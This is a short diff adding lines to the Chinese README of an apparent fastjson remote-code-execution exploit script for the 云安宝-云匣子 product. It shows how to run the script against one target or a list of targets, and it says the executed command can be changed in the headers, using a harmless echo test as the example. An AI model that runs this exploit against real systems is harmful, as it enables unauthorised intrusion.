@@ -19,3 +19,8 @@ python 云安宝-云匣子config_fastjsonRCE.py -u http://xx.xx.xx.xx
 python 云安宝-云匣子config_fastjsonRCE.py -f 123.txt
 ```
 
+在headers变量出可以自行定义执行的命令
+这里是`echo JWGYFCGYa` 输出字符串 `JWGYFCGYa`
+```
+"Cmd": "echo JWGYFCGYa"
+```
